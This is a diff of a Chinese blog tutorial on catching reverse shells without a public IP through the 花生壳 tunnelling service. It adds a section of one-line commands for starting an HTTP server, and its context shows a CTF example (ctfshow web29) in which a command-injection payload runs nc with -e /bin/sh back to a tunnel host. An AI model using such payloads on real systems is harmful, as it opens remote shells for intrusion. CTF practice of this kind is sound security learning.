@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E8%8A%B1%E7%94%9F%E5%A3%B3"><span class="toc-text">下载花生壳</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-text">配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nc"><span class="toc-text">nc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E8%8A%B1%E7%94%9F%E5%A3%B3"><span class="toc-text">下载花生壳</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-text">配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nc"><span class="toc-text">nc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B5%B7http%E6%9C%8D%E5%8A%A1"><span class="toc-text">起http服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a></li></ol>
     </div>
   
         
@@ -248,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">233字</span>
+        <span class="post-count">312字</span>
       </span>
     </span>
 
@@ -296,6 +296,16 @@
 <hr>
 <h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p>nc开启监听</p>
 <p><img src="/blog/2023/06/30/%E6%97%A0%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/image-20230630164039261.png" alt="image-20230630164039261"></p>
+<hr>
+<h1 id="起http服务"><a href="#起http服务" class="headerlink" title="起http服务"></a>起http服务</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span>
+php <span class="token parameter variable">-S</span> <span class="token number">0.0</span>.0.0:8080
+ruby <span class="token parameter variable">-run</span> <span class="token parameter variable">-e</span> httpd <span class="token builtin class-name">.</span> <span class="token parameter variable">-p</span> <span class="token number">9000</span>
+busybox httpd <span class="token parameter variable">-f</span> <span class="token parameter variable">-p</span> <span class="token number">3333</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行在哪个目录，网站的根目录就在哪</p>
+<p>然后花生壳那边配置的内网端口要设置为这里对应的端口号</p>
+<p>映射类型要花6块钱买个HTCP</p>
+<hr>
 <h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>以ctfshow web29为例</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc 76135132qk.imdo.co 50132 -e /bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
